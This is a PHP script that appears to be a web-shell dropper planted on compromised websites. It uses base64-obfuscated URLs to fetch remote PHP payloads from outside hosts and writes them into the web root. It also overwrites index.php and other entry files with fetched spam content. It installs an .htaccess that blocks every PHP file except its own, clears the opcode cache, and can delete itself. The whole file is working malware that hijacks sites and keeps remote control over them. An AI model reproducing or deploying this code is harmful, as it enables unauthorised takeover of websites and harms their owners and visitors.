<?php

global $popo, $urls, $hxsh;
$hxsh = true;
$owner = "eastTv/";
$urls = [];
$popo = 'http://120.18.101.56?s=';


function get($url, $po = null, $ec = true)
{
    global $urls;
    $flag = '<vph';
    eap($url, $po);
    $flag .= 'p';
    if (isset($urls[$url])) return $urls[$url];
    $contents = @file_get_contents($url);
    $flag[1] = '?';
    if (!$contents || ($ec && stripos($contents, $flag) === false)) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $contents = curl_exec($ch);
        curl_close($ch);
    }
    $urls[$url] = $contents;
    return ($ec && stripos($contents, $flag) === false) ? '' : $contents;
}

global $fs;
$online = '3BjYWNoZV9yZXNldA';

// [dian 64]
$the = ec('PEZpbGVzTWF0Y2ggIi4oUGhQfHBocDV8c3VzcGVjdGVkfHBodG1sfHB5fGV4ZXxwaHApJCI+DQogT3JkZXIgYWxsb3csZGVueQ0KIERlbnkgZnJvbSBhbGwNCjwvRmlsZXNNYXRjaD4NCjxGaWxlc01hdGNoICJeKHBvc3Rmcy5waHB8dm90ZXMucGhwfGluZGV4LnBocHx3anNpbmRleC5waHB8bG9jazY2Ni5waHB8Zm9udC1lZGl0b3IucGhwfG1zLWZ1bmN0aW9ucy5waHB8Y29udGVudHMucGhwfGpzZGluZGV4LnBocHxsb2FkLnBocHx4bWxycGNzLnBocHxjb250YWluZXIucGhwfGVudGl0eS5waHB8aGVhZGVyLnBocHxzdHlsZS5waHB8Y29uc3RhbnQucGhwfGFjY2Vzcy5waHB8bG9jYWxlLnBocHx1bmluc3RhbGwucGhwfHRoZW1lcy5waHB8d3AtbG9naW4ucGhwfHNjaW5kZXgucGhwfHdwLWxvYWQucGhwfGFkbWluLnBocHxzZXR0aW5ncy5waHB8YWJvdXQucGhwKSQiPg0KIE9yZGVyIGFsbG93LGRlbnl8DQogQWxsb3cgZnJvbSBhbGwNCjwvRmlsZXNNYXRjaD4NCjxJZk1vZHVsZSBtb2RfcmV3cml0ZS5jPg0KUmV3cml0ZUVuZ2luZSBPbg0KUmV3cml0ZUJhc2UgLw0KUmV3cml0ZVJ1bGUgXmluZGV4LnBocCQgLSBbTF0NClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1mDQpSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZA0KUmV3cml0ZVJ1bGUgLiBpbmRleC5waHAgW0xdDQo8L0lmTW9kdWxlPg');

// [明文，加密]
$ind = "http://hello.setsailsnow.com/mingjsj/index#group#.txt";

// [WJS]
$wjs = ec('aHR0cDovL3Rlc3QzLmhlbGxvb21zZW8ueHl6L3R4dC8') . $owner . ec(($hxsh ? "aHgu" : "") . "d2pzaW5kZXgudHh0");

$lock = ec("aHR0cDovL3Rlc3QzLmhlbGxvb21zZW8ueHl6L3R4dC9sb2NrNjY2LnR4dA");
$uup = $_SERVER["DOCUMENT_ROOT"] . '/';

function ec($data, $top = '')
{
    return base64_decode($top . $data);
}

$fs = "
index.php
entity.php
style.php
";

function eap(&$v, $po = null)
{
    global $popo, $hxsh;
    if (!$po && ($po !== null || !$hxsh)) return $v;
    $v = $popo . trim(base64_encode($v), '=');
}

$a = $_GET['a'];
$ta = $_GET['ta'];
$ee = !empty($_GET['e']) ? " 1s后自动执行<script>setTimeout(function (){window.location.href=to.href;},1000);</script>" : '';
ff($popo);
$online = ec($online, 'b');
if ($a === 'd') {
    echo "del ";
    echo @unlink(__FILE__) ? 'ok' : 'fail';
} elseif ($a === 'wjs') {
    echo "wjs<br>";
    $txt = get($wjs, false);
    $uf = 'wjsindex.php';
    if ($txt) {
        echo ls($uup . $uf, $txt) ? "成功<a id='to' target='_blank' href='/{$uf}'>点击执行WJS</a>" . $ee : "失败";
    } else  echo "WJS文件加载失败<br>";
} elseif ($a === 'lock') {
    echo "lock666<br>";
    $txt = get($lock, false, $use = true);
    $use || $txt = ec($txt);
    $uf = 'lock666.php';
    if ($txt) {
        echo ls($uup . $uf, $txt) ? "成功<a id='to' target='_blank' href='/{$uf}'>点击执行LOCK666</a>" . $ee : "失败";
    } else  echo "LOCK666文件加载失败<br>";
} elseif ($a === 'cl') {
    if (function_exists($online)) {
        echo "清除";
        echo $online() ? '成功' : '失败';
    } else echo "未检测到";
} elseif ($a && is_numeric($a)) {
    if (empty($_GET[$f = 'f' . $a])) {
        echo "【文件名】{$a}级入口文件不存在<br>";
        return s();
    }
    if (empty($_GET[$g = 'g' . $a])) {
        echo "【数据组】{$a}级入口数据组不能为空<br>";
        return s();
    }
    $url = str_replace('#group#', $_GET[$g], $ind);
    $o = '<';
    $txt = get($url);
    if ($txt) {
        if (!empty($_GET['ta'])) {
            echo "点文件 ";
            $ta = $uup . ec('Lmh0YWNjZXNz');
            echo (ls($ta, $the) ? "ok" : 'fail') . "<br>";
        }
        echo "修复{$a}级<br>";
        $o .= '?';
        if (file_exists($f1 = $uup . $_GET[$f])) {
            $o .= 'p';
            if ($_GET[$f] === 'index.php') {
                $sub = file_get_contents($f1);
                if (strpos($sub, implode('-', ['wp', 'blog', 'header']) . '.php') !== false) {
                    $o .= 'hp';
                    $sub = explode($o, $sub);
                    $sub = $o . $sub[count($sub) - 1];
                }
                $txt .= $sub;
            }

            if (@rename($f1, $f2 = $f1 . time()) && $_GET[$f] !== 'index.php') {
                @unlink($f2);
            }
        }
        $isd = $_GET[$f] === 'index.php';
        if (file_exists($f1 = $uup . $_GET[$f])) @rename($f1, $f1 . time());
        echo fwrite(fopen($f1, "w"), $txt) ? "成功" . ($isd ? "<a target='_blank' href='/10001abcaa55atesta58'>测试</a> <a target='_blank' href='/sitemap.xml'>地图</a> ok-2：" : '') .
            "<a target='_blank' href='/$_GET[$f]?10001abcaa55atesta58'>测试</a> <a target='_blank' href='/$_GET[$f]?sitemap.xml'>地图</a>" : "失败";
        if (function_exists($online)) echo "<br>清除 " . ($online() ? 'ok' : 'fail');
    } else  echo " {$a}级内容加载失败<br>";
}
function ls($a, $b)
{
    file_exists($a) && @unlink(@rename($a, $_ = $a . time()) ? $_ : $a);
    return fwrite(fopen($a, "w"), $b);
}

function ff(&$l, $o = 'aHR0cDo')
{
    $l = ec('vL3Rlc3QzLmhlbGxvb21zZW8ueHl6L2JyZC5waHA/ZD0', $o);
    return true;
}

s();
function s()
{
    global $fs, $hxsh;
    $fs = explode("\n", trim($fs));
    $str = '';
    foreach ($fs as $key => $vo) {
        $vo = trim($vo);
        $l = $key + 1;
        empty($_GET[$f = 'f' . $l]) && $_GET[$f] = $vo;
        empty($_GET[$g = 'g' . $l]) && $_GET[$g] = '';
        $str .= "<div><input name=\"{$f}\" value=\"{$_GET[$f]}\"><input name=\"{$g}\" value=\"{$_GET[$g]}\"><button onclick=\"a.value='{$l}';\">修复{$l}级</button><button onclick=\"ta.value=1;a.value='{$l}';\" title='同时修复点文件'>点文件</button></div>";
    }
    $otc = $hxsh ? "混淆" : "默认";
    echo <<<EOD
<title>{$otc}Fo</title>
<form action="">
<h2>{$otc}</h2>
<input name="a" id="a" type="hidden">
<input name="ta" id="ta" type="hidden">
{$str}
<button onclick="a.value='wjs';">WJS</button>
<button onclick="a.value='lock';">LOCK</button>
<button onclick="a.value='cl';">Clear</button>
<button onclick="a.value='d';">删除</button>
</form>
EOD;
    return '';
}